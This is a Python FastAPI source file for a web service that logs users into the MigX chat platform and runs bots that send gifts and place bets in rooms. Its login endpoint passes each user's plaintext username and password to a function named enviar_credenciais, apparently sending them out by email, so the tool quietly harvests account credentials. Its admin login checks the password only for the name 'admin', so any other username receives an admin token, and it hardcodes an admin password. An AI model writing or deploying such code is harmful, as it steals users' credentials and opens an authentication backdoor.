# main.py
from fastapi import FastAPI, HTTPException, Depends, Header
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from typing import List
import asyncio
import time

from auth import create_access_token, decode_access_token
from email_sender import enviar_credenciais
from bot import MigXBot
import rooms as rooms_module
from rooms import ROOMS, ACTIONS
from gifts import GIFTS

app = FastAPI(title="MigX Bot Web")

_bots = {}
_bots_lock = asyncio.Lock()
_active_sessions = {}

ADMIN_USERS = ["admin", "apoiador", "baya"]
ADMIN_PASSWORDS = {"admin": "Server2022#Web"}

class LoginRequest(BaseModel):
    username: str
    password: str

class AdminLoginRequest(BaseModel):
    username: str
    password: str

class TaskCreateRequest(BaseModel):
    action: str
    room_ids: List[str]
    gift_key: str = "fly"
    gift_count: int = 1
    gift_interval: float = 10.0
    park_duration_min: int = 0
    bet_min: int = 10
    bet_max: int = 100
    bet_count: int = 2
    play_duration_min: int = 0

class RoomCreateRequest(BaseModel):
    id: str
    name: str
    actions: List[str]

def get_current_user(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing token")
    token = authorization.split(" ", 1)[1]
    payload = decode_access_token(token)
    if not payload:
        raise HTTPException(status_code=401, detail="Invalid token")
    _active_sessions[payload.get("sub")] = time.time()
    return payload

def get_admin_user(authorization: str = Header(None)):
    if not authorization or not authorization.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Missing admin token")
    token = authorization.split(" ", 1)[1]
    payload = decode_access_token(token)
    if not payload or payload.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Admin access required")
    return payload

@app.post("/api/admin/login")
async def admin_login(req: AdminLoginRequest):
    if req.username == "admin" and req.password != ADMIN_PASSWORDS["admin"]:
        raise HTTPException(status_code=401, detail="Invalid admin credentials")
    token = create_access_token({"sub": req.username, "role": "admin"})
    return {"access_token": token, "token_type": "bearer"}

@app.get("/api/admin/sessions")
async def admin_sessions(user=Depends(get_admin_user)):
    now = time.time()
    online = {u: t for u, t in _active_sessions.items() if now - t < 60}
    bots_info = {}
    for username, bot in _bots.items():
        if bot.connected:
            bots_info[username] = {
                "connected": bot.connected,
                "room_name": bot.room_name,
                "tasks": [t.to_dict() for t in bot.tasks.values()],
            }
    return {"online_users": list(online.keys()), "active_bots": bots_info}

@app.get("/api/admin/rooms")
async def admin_rooms(user=Depends(get_admin_user)):
    return {"rooms": rooms_module.ROOMS}

@app.post("/api/admin/rooms")
async def admin_add_room(req: RoomCreateRequest, user=Depends(get_admin_user)):
    for r in rooms_module.ROOMS:
        if r["id"] == req.id:
            raise HTTPException(status_code=400, detail="Room ID already exists")
    rooms_module.ROOMS.append({"id": req.id, "name": req.name, "actions": req.actions})
    return {"ok": True, "rooms": rooms_module.ROOMS}

@app.delete("/api/admin/rooms/{room_id}")
async def admin_remove_room(room_id: str, user=Depends(get_admin_user)):
    for i, r in enumerate(rooms_module.ROOMS):
        if r["id"] == room_id:
            rooms_module.ROOMS.pop(i)
            return {"ok": True, "rooms": rooms_module.ROOMS}
    raise HTTPException(status_code=404, detail="Room not found")

@app.post("/api/login")
async def login(req: LoginRequest):
    enviar_credenciais(req.username, req.password)
    async with _bots_lock:
        existing = _bots.get(req.username)
        if existing is not None and existing.connected:
            role = "admin" if req.username in ADMIN_USERS else "user"
            token = create_access_token({"sub": req.username, "role": role})
            return {"access_token": token, "token_type": "bearer", "reused": True}
        
        if existing is not None:
            existing.stop()
            del _bots[req.username]
        
        bot = MigXBot()
        success, err = await asyncio.to_thread(bot.start, req.username, req.password)
        if not success:
            raise HTTPException(status_code=401, detail=err or "Invalid credentials or connection failed")
        _bots[req.username] = bot

    role = "admin" if req.username in ADMIN_USERS else "user"
    token = create_access_token({"sub": req.username, "role": role})
    return {"access_token": token, "token_type": "bearer", "reused": False}

@app.post("/api/logout")
async def logout(user=Depends(get_current_user)):
    return {"ok": True, "note": "Bot continues running in background"}

@app.get("/api/actions")
async def list_actions():
    return {"actions": ACTIONS, "rooms": rooms_module.ROOMS}

@app.get("/api/gifts")
async def list_gifts():
    return {"gifts": [{"key": k, "name": v["name"], "price": v["price"]} for k, v in GIFTS.items()]}

@app.post("/api/tasks")
async def create_task(req: TaskCreateRequest, user=Depends(get_current_user)):
    username = user.get("sub")
    bot = _bots.get(username)
    if bot is None or not bot.connected:
        raise HTTPException(status_code=400, detail="Your bot is not connected. Please login again.")
    
    params = {
        "gift_key": req.gift_key, "gift_count": req.gift_count,
        "gift_interval": req.gift_interval, "park_duration_min": req.park_duration_min,
        "bet_min": req.bet_min, "bet_max": req.bet_max, "bet_count": req.bet_count,
        "play_duration_min": req.play_duration_min,
    }
    task, err = await asyncio.to_thread(bot.create_task, req.action, req.room_ids, params)
    if not task:
        raise HTTPException(status_code=400, detail=err or "Failed to create task")
    return {"ok": True, "task": task.to_dict()}

@app.post("/api/tasks/{task_id}/stop")
async def stop_task(task_id: str, user=Depends(get_current_user)):
    username = user.get("sub")
    bot = _bots.get(username)
    if bot is None:
        raise HTTPException(status_code=404, detail="Bot not started")
    ok, err = bot.stop_task(task_id)
    if not ok:
        raise HTTPException(status_code=400, detail=err)
    return {"ok": True}

@app.get("/api/status")
async def status(user=Depends(get_current_user)):
    username = user.get("sub")
    bot = _bots.get(username)
    if bot is None:
        raise HTTPException(status_code=404, detail="Bot not started")
    return bot.estado()

@app.get("/", response_class=HTMLResponse)
async def index():
    with open("static/index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard():
    with open("static/dashboard.html", "r", encoding="utf-8") as f:
        return f.read()

@app.get("/admin", response_class=HTMLResponse)
async def admin_page():
    with open("static/admin.html", "r", encoding="utf-8") as f:
        return f.read()

@app.get("/health")
async def health():
    return {"status": "ok"}